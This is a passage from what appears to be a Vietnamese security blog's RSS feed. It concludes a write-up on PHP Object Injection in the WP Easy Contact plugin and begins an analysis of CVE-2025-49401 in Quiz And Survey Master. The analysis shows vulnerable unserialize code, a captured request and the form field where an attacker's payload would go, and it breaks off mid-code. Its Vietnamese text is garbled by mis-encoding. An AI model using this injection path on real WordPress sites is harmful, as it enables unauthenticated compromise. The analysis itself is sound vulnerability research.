class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng trong &lt;strong&gt;WP Easy Contact &amp;lt;= 4.0.1&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác x·ª≠ l√Ω input kh√¥ng an to√†n, cho ph√©p kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng tr·ª±c ti·∫øp t·ª´ d·ªØ li·ªáu ng∆∞·ªùi d√πng. B·∫±ng c√°ch l·ª£i d·ª•ng tham s·ªë &lt;code&gt;div_id&lt;/code&gt;, attacker c√≥ th·ªÉ th·ª±c hi·ªán &lt;strong&gt;PHP Object Injection&lt;/strong&gt; v√† d·∫´n ƒë·∫øn th·ª±c thi m√£ t√πy √Ω. B·∫£n v√° ·ªü &lt;strong&gt;4.0.2&lt;/strong&gt; ƒë√£ kh·∫Øc ph·ª•c b·∫±ng c√°ch b·ªï sung c∆° ch·∫ø whitelist v√† sanitize input, ch·ªâ cho ph√©p kh·ªüi t·∫°o c√°c class h·ª£p l·ªá. ƒê√¢y l√† minh ch·ª©ng r√µ r√†ng cho vi·ªác deserialization kh√¥ng an to√†n c√≥ th·ªÉ tr·ªü th√†nh ƒëi·ªÉm khai th√°c nghi√™m tr·ªçng khi k·∫øt h·ª£p v·ªõi quy·ªÅn truy c·∫≠p kh√¥ng x√°c th·ª±c.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;B·ªÅ m·∫∑t t·∫•n c√¥ng kh√¥ng x√°c th·ª±c&lt;/strong&gt;: L·ªó h·ªïng ƒë∆∞·ª£c k√≠ch ho·∫°t qua &lt;code&gt;wp_ajax_nopriv&lt;/code&gt;, kh√¥ng c·∫ßn ƒëƒÉng nh·∫≠p.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy√™n nh√¢n g·ªëc r·ªÖ&lt;/strong&gt;: S·ª≠ d·ª•ng tr·ª±c ti·∫øp input ng∆∞·ªùi d√πng (&lt;code&gt;new $widg_arr[1]()&lt;/code&gt;), kh√¥ng c√≥ ki·ªÉm tra.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Chi·∫øn l∆∞·ª£c v√° l·ªói&lt;/strong&gt;: √Åp d·ª•ng &lt;strong&gt;whitelist&lt;/strong&gt; v√† &lt;strong&gt;sanitize&lt;/strong&gt; ƒë·ªÉ gi·ªõi h·∫°n class h·ª£p l·ªá.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Best practice&lt;/strong&gt;: Lu√¥n ki·ªÉm tra v√† l√†m s·∫°ch d·ªØ li·ªáu ƒë·∫ßu v√†o, tr√°nh deserialization kh√¥ng an to√†n, h·∫°n ch·∫ø kh·ªüi t·∫°o ƒë·ªëi t∆∞·ª£ng t·ª´ ngu·ªìn kh√¥ng tin c·∫≠y.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Deserialization&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/wp-easy-contact/vulnerability/wordpress-wp-easy-contact-plugin-4-0-1-php-object-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress WP Easy Contact Plugin &amp;lt;= 4.0.1 is vulnerable to a high priority PHP Object Injection&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-49401 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-17-cve-2025-49401/</link>
      <pubDate>Mon, 17 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-17-cve-2025-49401/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/app.gif&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin n√†y th·ª±c hi·ªán thao t√°c &lt;strong&gt;unserialize&lt;/strong&gt; d·ªØ li·ªáu m√† ng∆∞·ªùi d√πng g·ª≠i qua tr∆∞·ªùng form, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c&lt;/strong&gt; th·ª±c hi·ªán &lt;strong&gt;PHP Object Injection&lt;/strong&gt; n·∫øu t·ªìn t·∫°i m·ªôt &lt;em&gt;gadget&lt;/em&gt; ph√π h·ª£p trong h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-49401&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-49401&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 10.2.5&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 10.2.6&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/quiz-master-next/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Quiz And Survey Master Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Quiz And Survey Master&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.5&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;10.2.6&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng &lt;code&gt;maybe_unserialize()&lt;/code&gt;. D√π ƒë√£ c√≥ bi·ªán ph√°p ki·ªÉm tra, c∆° ch·∫ø n√†y v·∫´n ch∆∞a ƒë·∫£m b·∫£o an to√†n tuy·ªát ƒë·ªëi.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( preg_match( &amp;#39;/^(O|C):\d&amp;#43;:/&amp;#39;, $qmn_sanitize_random_ids ) ) {&#xA;    return &amp;#39;&amp;#39;;&#xA;}&#xA;if ( is_serialized( $qmn_sanitize_random_ids ) ) {&#xA;    $unserialized = maybe_unserialize( $qmn_sanitize_random_ids );&#xA;    if ( ! is_object( $unserialized ) &amp;amp;&amp;amp; ! is_resource( $unserialized ) ) {&#xA;        return $unserialized;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° ƒë√£ s·ª≠ d·ª•ng &lt;code&gt;unserialize()&lt;/code&gt; thay v√¨ &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Ch·∫∑n to√†n b·ªô vi·ªác t·∫°o object khi unserialize b·∫±ng &lt;code&gt;[&#39;allowed_classes&#39; =&amp;gt; false]&lt;/code&gt; =&amp;gt; NgƒÉn ch·∫∑n PHP Object Injection&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/diff.png&#39; alt=&#34;Diff&#34; height=&#34;772&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Sau khi xem qua logic c·ªßa h√†m &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;, t√¥i nh·∫≠n th·∫•y c√°c t·ª´ kh√≥a nh∆∞ &lt;code&gt;question&lt;/code&gt; v√† &lt;code&gt;answer&lt;/code&gt; xu·∫•t hi·ªán kh√° nhi·ªÅu, cho th·∫•y h√†m n√†y nhi·ªÅu kh·∫£ nƒÉng li√™n quan tr·ª±c ti·∫øp ƒë·∫øn ch·ª©c nƒÉng x·ª≠ l√Ω c√¢u h·ªèi v√† c√¢u tr·∫£ l·ªùi.&lt;/p&gt;&#xA;&lt;p&gt;Thay v√¨ l·∫ßn theo t·ª´ng b∆∞·ªõc trace, t√¥i s·∫Ω ch·ªß ƒë·ªông t√¨m c√°c ch·ª©c nƒÉng c√≥ li√™n quan ƒë·∫øn &lt;code&gt;question&lt;/code&gt; v√† &lt;code&gt;answer&lt;/code&gt; ƒë·ªÉ s·ª≠ d·ª•ng, ƒë·ªìng th·ªùi k·∫øt h·ª£p debug t·∫°i h√†m &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;. N·∫øu c√°ch n√†y kh√¥ng hi·ªáu qu·∫£ th√¨ ta s·∫Ω ti·∫øp t·ª•c trace chi ti·∫øt.&lt;/p&gt;&#xA;&lt;p&gt;Sau m·ªôt h·ªìi t·ªçc v·∫°ch, t√¥i ƒë√£ t·∫°o post v·ªõi question t√πy √Ω&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; title=&#34;T·∫°o quiz v·ªõi Block c·ªßa plugin&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/create_quiz.png&#34; data-sub-html=&#34;&lt;h2&gt;Quiz Created&lt;/h2&gt;&lt;p&gt;T·∫°o quiz v·ªõi Block c·ªßa plugin&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/create_quiz.png&#39; alt=&#34;Quiz Created&#34; height=&#34;625&#34; width=&#34;978&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;T·∫°o quiz v·ªõi Block c·ªßa plugin&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Truy c·∫≠p post v√† &lt;strong&gt;submit answer&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#34; title=&#34;Debugger ·ªü h√†m qsm_questions_answers_shortcode_to_text&#34; data-thumbnail=&#34;/posts/2025-11-17-cve-2025-49401/debug1.png&#34; data-sub-html=&#34;&lt;h2&gt;Debug&lt;/h2&gt;&lt;p&gt;Debugger ·ªü h√†m qsm_questions_answers_shortcode_to_text&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-17-cve-2025-49401/debug1.png&#39; alt=&#34;Debug&#34; height=&#34;428&#34; width=&#34;1189&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Debugger ·ªü h√†m qsm_questions_answers_shortcode_to_text&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn h√†m &lt;code&gt;qsm_questions_answers_shortcode_to_text()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;Request hi·ªán t·∫°i:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:145.0) Gecko/20100101 Firefox/145.0&#xA;Accept: */*&#xA;Accept-Language: en-US,en;q=0.7,vi;q=0.3&#xA;Accept-Encoding: gzip, deflate, br&#xA;X-Requested-With: XMLHttpRequest&#xA;Content-Type: multipart/form-data; boundary=----geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Length: 2373&#xA;Origin: http://localhost&#xA;Connection: keep-alive&#xA;Referer: http://localhost/index.php/2025/11/17/quiz-1/&#xA;Sec-Fetch-Dest: empty&#xA;Sec-Fetch-Mode: cors&#xA;Sec-Fetch-Site: same-origin&#xA;X-PwnFox-Color: blue&#xA;Priority: u=0&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_hidden_questions&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_nonce&amp;#34;&#xA;&#xA;b667038586&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_unique_key&amp;#34;&#xA;&#xA;691b485dd00e5&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;question1&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;answer_limit_keys_1&amp;#34;&#xA;&#xA;&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_question_list&amp;#34;&#xA;&#xA;1Q&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_all_questions_count&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;total_questions&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;timer&amp;#34;&#xA;&#xA;3&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;timer_ms&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qmn_quiz_id&amp;#34;&#xA;&#xA;1&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;complete_quiz&amp;#34;&#xA;&#xA;confirmation&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;current_page&amp;#34;&#xA;&#xA;0&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;quiz_start_date&amp;#34;&#xA;&#xA;06:50:55 AM 11/17/2025&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;action&amp;#34;&#xA;&#xA;qmn_process_quiz&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;nonce&amp;#34;&#xA;&#xA;b667038586&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;qsm_unique_key&amp;#34;&#xA;&#xA;691b485dd00e5&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;currentuserTime&amp;#34;&#xA;&#xA;1763395682&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4&#xA;Content-Disposition: form-data; name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;&#xA;Asia/Bangkok&#xA;------geckoformboundary64b770b36de80c7ad71f430a81ec77b4--&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;qmn_sanitize_random_ids_data()&lt;/code&gt; s·∫Ω g·ªçi ƒë·∫øn &lt;code&gt;maybe_unserialize()&lt;/code&gt;. Nh∆∞ng tr∆∞·ªõc h·∫øt ph·∫£i ƒë√°p ·ª©ng ƒëi·ªÅu ki·ªán:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;if ( ! empty( $_POST[&amp;#39;quiz_answer_random_ids&amp;#39;] ) )&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ta c√≥ th·ªÉ t·∫≠n d·ª•ng 1 tr∆∞·ªùng trong HTTP request ·ªü tr√™n ƒë·ªÉ th√™m thay ƒë·ªïi th√†nh &lt;code&gt;quiz_answer_random_ids&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;- Content-Disposition: form-data; name=&amp;#34;currentuserTimeZone&amp;#34;&#xA;- Asia/Bangkok&#xA;&amp;#43; Content-Disposition: form-data; name=&amp;#34;quiz_answer_random_ids&amp;#34;&#xA;&amp;#43; payload&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Ch√≠nh value c·ªßa &lt;code&gt;qmn_sanitize_random_ids&lt;/code&gt; s·∫Ω l√† gi√° tr·ªã ƒë∆∞·ª£c ƒë·∫∑t l√†m ƒë·ªëi s·ªë cho h√†m &lt;code&gt;maybe_unserialize()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;![Debug](Gi√° tr·ªã c·ªßa qmn_sanitize_random_ids)&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;function qmn_sanitize_random_ids_data( $qmn_sanitize_random_ids ) 